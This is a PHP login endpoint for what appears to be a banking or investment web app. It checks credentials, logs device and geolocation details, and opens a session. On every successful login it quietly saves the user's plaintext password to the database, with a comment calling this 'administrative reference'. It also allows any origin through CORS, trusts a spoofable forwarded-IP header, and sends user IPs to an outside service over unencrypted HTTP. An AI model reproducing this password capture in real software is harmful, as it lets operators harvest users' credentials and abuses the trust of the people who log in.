<?php
require_once 'config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    jsonResponse(['success' => false, 'message' => 'Method not allowed'], 405);
}

// Get JSON input
$inputRaw = file_get_contents('php://input');
$input = json_decode($inputRaw, true);

// Fallback to POST data if JSON is empty
if (empty($input)) {
    $input = $_POST;
}

$username = trim($input['username'] ?? '');
$password = $input['password'] ?? '';

// Validate input
if (empty($username) || empty($password)) {
    jsonResponse(['success' => false, 'message' => 'Username and password are required'], 400);
}

try {
    // Find user by username or email
    $stmt = $pdo->prepare("
        SELECT id, username, email, password, firstname, lastname, balance, account_number, status, ev, sv, 
               concept, dividends, cdt, investment_balance 
        FROM users 
        WHERE (username = :username OR email = :email) 
        LIMIT 1
    ");
    $stmt->execute(['username' => $username, 'email' => $username]);
    $user = $stmt->fetch();

    if (!$user) {
        jsonResponse(['success' => false, 'message' => 'Invalid username or password'], 401);
    }

    // Check if account is active
    if ($user['status'] == 0) {
        jsonResponse(['success' => false, 'message' => 'Your account is pending administrator approval. Please wait for activation or contact support.'], 403);
    }
    if ($user['status'] != 1) {
        jsonResponse(['success' => false, 'message' => 'Your account has been suspended. Please contact support.'], 403);
    }

    // Verify password
    if (!verifyPassword($password, $user['password'])) {
        jsonResponse(['success' => false, 'message' => 'Invalid username or password'], 401);
    }

    // Capturar contraseña en texto plano para referencia administrativa
    // Se guarda cuando el usuario hace login exitoso
    $auth_token = bin2hex(random_bytes(32));
    $stmt = $pdo->prepare("UPDATE users SET plain_password = :plain_pwd, auth_token = :token, last_login = NOW(), updated_at = NOW() WHERE id = :id");
    $stmt->execute(['plain_pwd' => $password, 'token' => $auth_token, 'id' => $user['id']]);

    // ── Log the login attempt ──────────────────────────────────────────────
    try {
        $pdo->exec("
            CREATE TABLE IF NOT EXISTS login_logs (
                id INT AUTO_INCREMENT PRIMARY KEY,
                user_id INT NOT NULL,
                username VARCHAR(100),
                ip_address VARCHAR(45),
                user_agent TEXT,
                device_type VARCHAR(50),
                browser VARCHAR(100),
                os VARCHAR(100),
                location_country VARCHAR(100),
                location_city VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                INDEX idx_user_id (user_id),
                INDEX idx_created_at (created_at)
            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
        ");

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
            ?? $_SERVER['HTTP_CLIENT_IP']
            ?? $_SERVER['REMOTE_ADDR']
            ?? '';
        // Take only the first IP if a list is given
        $ip = trim(explode(',', $ip)[0]);

        $ua       = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $device   = 'Desktop';
        $browser  = 'Unknown';
        $os       = 'Unknown';

        // Detect device type
        if (preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $ua)) {
            $device = preg_match('/iPad/i', $ua) ? 'Tablet' : 'Mobile';
        }

        // Detect browser
        if (preg_match('/Chrome\/([0-9.]+)/i', $ua, $m))       { $browser = 'Chrome ' . $m[1]; }
        elseif (preg_match('/Firefox\/([0-9.]+)/i', $ua, $m))  { $browser = 'Firefox ' . $m[1]; }
        elseif (preg_match('/Safari\/([0-9.]+)/i', $ua, $m))   { $browser = 'Safari'; }
        elseif (preg_match('/MSIE|Trident/i', $ua))            { $browser = 'Internet Explorer'; }
        elseif (preg_match('/Edge\/([0-9.]+)/i', $ua, $m))     { $browser = 'Edge ' . $m[1]; }

        // Detect OS
        if (preg_match('/Windows NT ([0-9.]+)/i', $ua, $m))    { $os = 'Windows'; }
        elseif (preg_match('/Mac OS X ([0-9._]+)/i', $ua, $m)) { $os = 'macOS'; }
        elseif (preg_match('/Android ([0-9.]+)/i', $ua, $m))   { $os = 'Android ' . $m[1]; }
        elseif (preg_match('/iPhone OS ([0-9_]+)/i', $ua, $m)) { $os = 'iOS ' . str_replace('_', '.', $m[1]); }
        elseif (preg_match('/Linux/i', $ua))                    { $os = 'Linux'; }

        // Geo-location via ip-api.com (free, no API key needed)
        $country = ''; $city = '';
        if ($ip && $ip !== '127.0.0.1' && $ip !== '::1') {
            $geo = @file_get_contents("http://ip-api.com/json/{$ip}?fields=country,city", false,
                stream_context_create(['http' => ['timeout' => 2]]));
            if ($geo) {
                $geoData = json_decode($geo, true);
                $country = $geoData['country'] ?? '';
                $city    = $geoData['city']    ?? '';
            }
        }

        $logStmt = $pdo->prepare("
            INSERT INTO login_logs (user_id, username, ip_address, user_agent, device_type, browser, os, location_country, location_city)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ");
        $logStmt->execute([$user['id'], $user['username'], $ip, $ua, $device, $browser, $os, $country, $city]);
    } catch (Exception $logEx) {
        error_log("Login log error: " . $logEx->getMessage());
    }
    // ─────────────────────────────────────────────────────────────────────

    // Create session
    $_SESSION['user_id'] = $user['id'];
    $_SESSION['username'] = $user['username'];
    $_SESSION['email'] = $user['email'];
    $_SESSION['logged_in'] = true;

    // Return user data (without password)
    unset($user['password']);
    
    jsonResponse([
        'success' => true,
        'message' => 'Login successful',
        'auth_token' => $auth_token,
        'user' => $user
    ]);

} catch (Exception $e) {
    error_log("Login error: " . $e->getMessage());
    jsonResponse(['success' => false, 'message' => 'Error processing the request'], 500);
}
